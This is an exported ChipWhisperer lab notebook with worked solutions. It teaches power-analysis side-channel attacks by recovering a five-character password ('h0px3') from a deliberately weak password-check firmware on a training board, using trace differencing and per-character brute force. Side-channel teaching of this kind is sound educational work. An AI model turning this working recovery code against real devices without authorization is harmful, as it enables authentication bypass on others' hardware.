SOLUTION WITH SIMULATION: Part 2, Topic 1, Lab B: Power Analysis for Password Bypass
====================================================================================



**SUMMARY:** *This tutorial will introduce you to breaking devices by
determining when a device is performing certain operations. Our target
device will be performing a simple password check, and we will
demonstrate how to perform a basic power analysis.*

**LEARNING OUTCOMES:**

-  How power can be used to determine timing information.
-  Plotting multiple iterations while varying input data to find
   interesting locations.
-  Using difference of waveforms to find interesting locations.
-  Performing power captures with ChipWhisperer hardware (hardware only)

Prerequisites
-------------

Hold up! Before you continue, check you’ve done the following tutorials:

-  ☑ Jupyter Notebook Intro (you should be OK with plotting & running
   blocks).
-  ☑ SCA101 Intro (you should have an idea of how to get
   hardware-specific versions running).

Power Trace Gathering
---------------------

At this point you’ve got to insert code to perform the power trace
capture. There are two options here: \* Capture from physical device. \*
Read from a file.

You get to choose your adventure - see the two notebooks with the same
name of this, but called ``(SIMULATED)`` or ``(HARDWARE)`` to continue.
Inside those notebooks you should get some code to copy into the
following section, which will define the capture function.

Be sure you get the ``"✔️ OK to continue!"`` print once you run the next
cell, otherwise things will fail later on!

Choose your setup options here:


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEARM'
    VERSION = 'HARDWARE'


**In [2]:**

.. code:: ipython3

    if VERSION == 'HARDWARE':
        %run "Lab 2_1B - Power Analysis for Password Bypass (HARDWARE).ipynb"
    elif VERSION == 'SIMULATED':
        %run "Lab 2_1B - Power Analysis for Password Bypass (SIMULATED).ipynb"


**Out [2]:**



.. parsed-literal::

    SS_VER set to SS_VER_1_0
    rm -f -- basic-passwdcheck-CWLITEARM.hex
    rm -f -- basic-passwdcheck-CWLITEARM.eep
    rm -f -- basic-passwdcheck-CWLITEARM.cof
    rm -f -- basic-passwdcheck-CWLITEARM.elf
    rm -f -- basic-passwdcheck-CWLITEARM.map
    rm -f -- basic-passwdcheck-CWLITEARM.sym
    rm -f -- basic-passwdcheck-CWLITEARM.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- basic-passwdcheck.s simpleserial.s stm32f3_hal.s stm32f3_hal_lowlevel.s stm32f3_sysmem.s
    rm -f -- basic-passwdcheck.d simpleserial.d stm32f3_hal.d stm32f3_hal_lowlevel.d stm32f3_sysmem.d
    rm -f -- basic-passwdcheck.i simpleserial.i stm32f3_hal.i stm32f3_hal_lowlevel.i stm32f3_sysmem.i
    .
    Welcome to another exciting ChipWhisperer target build!!
    arm-none-eabi-gcc.exe (GNU Arm Embedded Toolchain 9-2020-q2-update) 9.3.1 20200408 (release)
    Copyright (C) 2019 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: basic-passwdcheck.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/basic-passwdcheck.o.d basic-passwdcheck.c -o objdir/basic-passwdcheck.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/stm32f3_hal.o.d .././hal/stm32f3/stm32f3_hal.c -o objdir/stm32f3_hal.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal_lowlevel.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal_lowlevel.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/stm32f3_hal_lowlevel.o.d .././hal/stm32f3/stm32f3_hal_lowlevel.c -o objdir/stm32f3_hal_lowlevel.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_sysmem.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_sysmem.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/stm32f3_sysmem.o.d .././hal/stm32f3/stm32f3_sysmem.c -o objdir/stm32f3_sysmem.o 
    .
    Assembling: .././hal/stm32f3/stm32f3_startup.S
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f3_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3_startup.S -o objdir/stm32f3_startup.o
    .
    Linking: basic-passwdcheck-CWLITEARM.elf
    arm-none-eabi-gcc -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.o -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/basic-passwdcheck-CWLITEARM.elf.d objdir/basic-passwdcheck.o objdir/simpleserial.o objdir/stm32f3_hal.o objdir/stm32f3_hal_lowlevel.o objdir/stm32f3_sysmem.o objdir/stm32f3_startup.o --output basic-passwdcheck-CWLITEARM.elf --specs=nano.specs --specs=nosys.specs -T .././hal/stm32f3/LinkerScript.ld -Wl,--gc-sections -lm -Wl,-Map=basic-passwdcheck-CWLITEARM.map,--cref   -lm  
    .
    Creating load file for Flash: basic-passwdcheck-CWLITEARM.hex
    arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature basic-passwdcheck-CWLITEARM.elf basic-passwdcheck-CWLITEARM.hex
    .
    Creating load file for EEPROM: basic-passwdcheck-CWLITEARM.eep
    arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    --change-section-lma .eeprom=0 --no-change-warnings -O ihex basic-passwdcheck-CWLITEARM.elf basic-passwdcheck-CWLITEARM.eep \|\| exit 0
    .
    Creating Extended Listing: basic-passwdcheck-CWLITEARM.lss
    arm-none-eabi-objdump -h -S -z basic-passwdcheck-CWLITEARM.elf > basic-passwdcheck-CWLITEARM.lss
    .
    Creating Symbol Table: basic-passwdcheck-CWLITEARM.sym
    arm-none-eabi-nm -n basic-passwdcheck-CWLITEARM.elf > basic-passwdcheck-CWLITEARM.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       9680	    108	   1204	  10992	   2af0	basic-passwdcheck-CWLITEARM.elf
    +--------------------------------------------------------
    + Default target does full rebuild each time.
    + Specify buildtarget == allquick == to avoid full rebuild
    +--------------------------------------------------------
    +--------------------------------------------------------
    + Built for platform CW-Lite Arm \(STM32F3\) with:
    + CRYPTO_TARGET = NONE
    + CRYPTO_OPTIONS = AES128C
    +--------------------------------------------------------
    




.. parsed-literal::

    .././simpleserial/simpleserial.c: In function 'simpleserial_get':
    .././simpleserial/simpleserial.c:131:10: warning: variable 'ret' set but not used [-Wunused-but-set-variable]
      131 \|  uint8_t ret[1];
          \|          ^~~
    




.. parsed-literal::

    Serial baud rate = 38400
    INFO: Found ChipWhisperer😍
    Serial baud rate = 115200
    Detected known STMF32: STM32F302xB(C)/303xB(C)
    Extended erase (0x44), this can take ten seconds or more
    Attempting to program 9795 bytes at 0x8000000
    STM32F Programming flash...
    STM32F Reading flash...
    Verified flash OK, 9795 bytes
    Serial baud rate = 38400
    



**In [3]:**

.. code:: ipython3

    trace_test = cap_pass_trace("h\n")
    
    #Basic sanity check
    assert(len(trace_test) == 3000)
    print("✔️ OK to continue!")


**Out [3]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    ✔️ OK to continue!
    


Exploration
-----------

So what can we do with this? While first off - I’m going to cheat, and
tell you that we have a preset password that starts with ``h``, and it’s
5 characters long. But that’s the only hint so far - what can you do?
While first off, let’s try plotting a comparison of ``h`` to something
else.

If you need a reminder of how to do a plot - see the matplotlib section
of the **Jupyter Introduction** notebook.

The following cell shows you how to capture one power trace with ``h``
sent as a password. From there:

1. Try adding the plotting code and see what it looks like.
2. Send different passwords to the device. We’re only going to look at
   the difference between a password starting with ``h`` and something
   else right now.
3. Plot the different waveforms.


**In [4]:**

.. code:: ipython3

    #Example - capture 'h' - end with newline '\n' as serial protocol expects that
    trace_h = cap_pass_trace("h\n")
    
    print(trace_h)
    
    # ###################
    # START SOLUTION
    # ###################
    %matplotlib inline
    import matplotlib.pyplot as plt
    plt.figure()
    plt.plot(cap_pass_trace("h\n"))
    plt.plot(cap_pass_trace("0\n"))
    plt.show()
    # ###################
    # END SOLUTION
    # ###################


**Out [4]:**



.. parsed-literal::

    [ 0.00488281 -0.21386719 -0.15527344 ... -0.19140625 -0.13574219
     -0.10742188]
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    



.. image:: img/OPENADC-CWLITEARM-courses_sca101SOLN_Lab2_1B-PowerAnalysisforPasswordBypass_13_2.png


For reference, the output should look something like this:

If you are using the ``%matplotlib notebook`` magic, you can zoom in at
the start. What you want to notice is there is two code paths taken,
depending on a correct or incorrect path. Here for example is a correct
& incorrect character processed:

OK interesting – what’s next? Let’s plot every possible password
character we could send.

Our password implementation only recognizes characters in the list
``abcdefghijklmnopqrstuvwxyz0123456789``, so we’re going to limit it to
those valid characters for now.

Write some code in the following block that implements the following
algorithm:

::

   for CHARACTER in LIST_OF_VALID_CHARACTERS:
       trace = cap_pass_trace(CHARACTER + "\n")
       plot(trace)
       

The above isn’t quite valid code - so massage it into place! You also
may notice the traces are way too long - you might want to make a more
narrow plot that only does the first say 500 samples of the power trace.


**In [5]:**

.. code:: ipython3

    # ###################
    # START SOLUTION
    # ###################
    from tqdm.notebook import tqdm
    plt.figure()
    for c in tqdm('abcdefghijklmnopqrstuvwxyz0123456789'):
        trace = cap_pass_trace(c + "\n")
        plt.plot(trace[0:500])
    
    # ###################
    # END SOLUTION
    # ###################


**Out [5]:**





.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    






.. image:: img/OPENADC-CWLITEARM-courses_sca101SOLN_Lab2_1B-PowerAnalysisforPasswordBypass_16_3.png


The end result should be if you zoom in, you’ll see there is a location
where a single “outlier” trace doesn’t follow the path of all the other
traces. That is great news, since it means we learn something about the
system from power analysis.

Using your loop - you can also try modifying the analysis to capture a
correct “first” character, and then every other wrong second character.
Do you see a difference you might be able to detect?

The pseudo-code would look something like this:

::

   for CHARACTER in LIST_OF_VALID_CHARACTERS:
       trace = cap_pass_trace("h" + CHARACTER + "\n")
       plot(trace)

Give that a shot in your earlier code-block, and then let’s try and
automate this attack to understand the data a little better.

Automating an Attack against One Character
------------------------------------------

To start with - we’re going to automate an attack against a **single**
character of the password. Since we don’t know the password (let’s
assume), we’ll use a strategy of comparing all possible inputs together.

An easy way to do this might be to use something that we know can’t be
part of the valid password. As long as it’s processed the same way, this
will work just fine. So for now, let’s use a password as ``0x00`` (i.e.,
a null byte). We can compare the null byte to processing something else:


**In [6]:**

.. code:: ipython3

    %matplotlib inline
    import matplotlib.pylab as plt
    
    plt.figure()
    ref_trace = cap_pass_trace("\x00\n")[0:500]
    plt.plot(ref_trace)
    other_trace = cap_pass_trace("c\n")[0:500]
    plt.plot(other_trace)


**Out [6]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    [<matplotlib.lines.Line2D at 0x2cc8da9be08>]




.. image:: img/OPENADC-CWLITEARM-courses_sca101SOLN_Lab2_1B-PowerAnalysisforPasswordBypass_20_2.png


This will plot a trace with an input of “:raw-latex:`\x00`” - a null
password! This is an invalid character, and seems to be processed as any
other invalid password.

Let’s make this a little more obvious, and plot the difference between a
known reference & every other capture. You need to write some code that
does something like this:

::

   ref_trace = cap_pass_trace( "\x00\n")

   for CHARACTER in LIST_OF_VALID_CHARACTERS:
       trace = cap_pass_trace(CHARACTER + "\n")
       plot(trace - ref_trace)

Again, you may need to modify this a little bit such as adding code to
make a new ``figure()``. Also notice in the above example how I reduced
the number of samples.


**In [7]:**

.. code:: ipython3

    # ###################
    # START SOLUTION
    # ###################
    
    %matplotlib inline
    import matplotlib.pylab as plt
    
    plt.figure()
    ref_trace = cap_pass_trace("\x00\n")[0:500]
    
    for c in 'abcdefghijklmnopqrstuvwxyz0123456789': 
        trace = cap_pass_trace(c + "\n")[0:500]
        plt.plot(trace - ref_trace)
    
    # ###################
    # END SOLUTION
    # ###################
        


**Out [7]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    



.. image:: img/OPENADC-CWLITEARM-courses_sca101SOLN_Lab2_1B-PowerAnalysisforPasswordBypass_22_1.png


OK great - hopefully you now see one major “difference”. It should look
something like this:

What do do now? Let’s make this thing automatically detect such a large
difference. Some handy stuff to try out is the ``np.sum()`` and
``np.abs()`` function.

The first one will get absolute values:

.. code:: python

   import numpy as np
   np.abs([-1, -3, 1, -5, 6])

       Out[]: array([1, 3, 1, 5, 6])

The second one will add up all the numbers.

.. code:: python

   import numpy as np    
   np.sum([-1, -3, 1, -5, 6])

       Out[]: -2

Using just ``np.sum()`` means positive and negative differences will
cancel each other out - so it’s better to do something like
``np.sum(np.abs(DIFF))`` to get a good number indicating how “close” the
match was.


**In [8]:**

.. code:: ipython3

    import numpy as np
    np.abs([-1, -3, 1, -5, 6])


**Out [8]:**



.. parsed-literal::

    array([1, 3, 1, 5, 6])




**In [9]:**

.. code:: ipython3

    import numpy as np
    np.sum([-1, -3, 1, -5, 6])


**Out [9]:**



.. parsed-literal::

    -2




**In [10]:**

.. code:: ipython3

    np.sum(np.abs([-1, -3, 1, -5, 6]))


**Out [10]:**



.. parsed-literal::

    16



Taking your above loop, modify it to print an indicator of how closely
this matches your trace. Something like the following should work:

::

   ref_trace = cap_pass_trace( "\x00\n")

   for CHARACTER in LIST_OF_VALID_CHARACTERS:
       trace = cap_pass_trace(CHARACTER + "\n")
       diff = SUM(ABS(trace - ref_trace))

       print("{:1} diff = {:2}".format(CHARACTER, diff))


**In [11]:**

.. code:: ipython3

    # ###################
    # START SOLUTION
    # ###################
    
    ref_trace = cap_pass_trace( "\x00\n")
    
    for c in 'abcdefghijklmnopqrstuvwxyz0123456789': 
        trace = cap_pass_trace(c + "\n")
        diff = np.sum(np.abs(trace - ref_trace))
        
        print("{:1} diff = {:2}".format(c, diff))
        
    # ###################
    # END SOLUTION
    # ###################


**Out [11]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    a diff = 9.5078125
    b diff = 9.9482421875
    c diff = 5.5341796875
    d diff = 4.7890625
    e diff = 5.6484375
    f diff = 5.3720703125
    g diff = 4.8798828125
    h diff = 203.6220703125
    i diff = 5.9462890625
    j diff = 8.564453125
    k diff = 9.1689453125
    l diff = 6.810546875
    m diff = 7.2900390625
    n diff = 10.271484375
    o diff = 9.0498046875
    p diff = 6.279296875
    q diff = 4.5703125
    r diff = 8.599609375
    s diff = 10.2041015625
    t diff = 5.4453125
    u diff = 10.3623046875
    v diff = 5.9013671875
    w diff = 8.4208984375
    x diff = 9.193359375
    y diff = 7.3046875
    z diff = 6.83984375
    0 diff = 8.8134765625
    1 diff = 8.4208984375
    2 diff = 7.5908203125
    3 diff = 8.5625
    4 diff = 7.9375
    5 diff = 8.5439453125
    6 diff = 6.048828125
    7 diff = 9.4482421875
    8 diff = 4.75390625
    9 diff = 6.462890625
    


Now the easy part - modify your above code to automatically print the
correct password character. This should be done with a comparison of the
``diff`` variable - based on the printed characters, you should see one
that is ‘higher’ than the others. Set a threshold somewhere reasonable
(say I might use ``25.0`` based on one run).

Running a Full Attack
---------------------

Finally - let’s finish this off. Rather than attacking a single
character, we need to attack each character in sequence.

If you go back to the plotting of differences, you can try using the
correct first character & wrong second character. The basic idea is
exactly the same as before, but now we loop through 5 times, and just
build up the password based on brute-forcing each character.

Take a look at the following for the basic pseudo-code:

::

   guessed_pw = "" #Store guessed password so far

   do a loop 5 times (max password size):
       
       ref_trace = capture power trace(guessed_pw + "\x00\n")
       
       for CHARACTER in LIST_OF_VALID_CHARACTERS:
           trace = capture power trace (guessed_pw + CHARACTER + newline)
           diff = SUM(ABS(trace - ref_trace))
           
           if diff > THRESHOLD:
               
               guessed_pwd += c
               print(guessed_pw)
               
               break


**In [12]:**

.. code:: ipython3

    # ###################
    # START SOLUTION
    # ###################
    
    guessed_pw = ""
    
    
    for _ in range(0, 5):  
    
        ref_trace = cap_pass_trace(guessed_pw + "\x00\n")
        
        for c in 'abcdefghijklmnopqrstuvwxyz0123456789': 
            trace = cap_pass_trace(guessed_pw + c + "\n")
            diff = np.sum(np.abs(trace - ref_trace))
    
            if diff > 40.0:
                guessed_pw += c
                print(guessed_pw)
                break
    
    # ###################
    # END SOLUTION
    # ###################


**Out [12]:**



.. parsed-literal::

    h
    h0
    h0p
    h0px
    h0px3
    


You should get an output that looks like this:

::

   h
   h0
   h0p
   h0px
   h0px3

If so - 🥳🥳🥳🥳🥳🥳🥳🥳🥳🥳🥳🥳🥳 Congrats - you did it!!!!

If not - check some troubleshooting hints below. If you get really
stuck, check the ``SOLN`` version (there is one for both with hardware
and simulated).

Troubleshooting - Always get ‘h’
--------------------------------

Some common problems you might run into - first, if you get an output
which keeps guessing the first character:

::

   h
   hh
   hhh
   hhhh
   hhhhh

Check that when you run the ``cap_pass_trace`` inside the loop (checking
the guessed password), are you updating the prefix of the password? For
example, the old version of the code (guessing a single character)
looked like this:

::

   trace = cap_pass_trace(c + "\n")

But that is always sending our first character only! So we need to send
the “known good password so far”. In the example code something like
this:

::

   trace = cap_pass_trace(guessed_pw + c + "\n")

Where ``guessed_pw`` progressively grows with the known good start of
the password.

Troubleshooting - Always get ‘a’
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

This looks like it’s always matching the first character:

::

   h
   ha
   haa
   haaa
   haaaa

Check that you update the ``ref_trace`` - if you re-use the original
reference trace, you won’t be looking at a reference where the first N
characters are good, and the remaining characters are bad. An easy way
to do this is again using the ``guessed_pw`` variable and appending a
null + newline:

::

   trace = cap_pass_trace(guessed_pw + "\x00\n")

--------------

NO-FUN DISCLAIMER: This material is Copyright (C) NewAE Technology Inc.,
2015-2020. ChipWhisperer is a trademark of NewAE Technology Inc.,
claimed in all jurisdictions, and registered in at least the United
States of America, European Union, and Peoples Republic of China.

Tutorials derived from our open-source work must be released under the
associated open-source license, and notice of the source must be
*clearly displayed*. Only original copyright holders may license or
authorize other distribution - while NewAE Technology Inc. holds the
copyright for many tutorials, the github repository includes community
contributions which we cannot license under special terms and **must**
be maintained as an open-source release. Please contact us for special
permissions (where possible).

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.


**In [13]:**

.. code:: ipython3

    assert guessed_pw == 'h0px3', "Failed to break password"
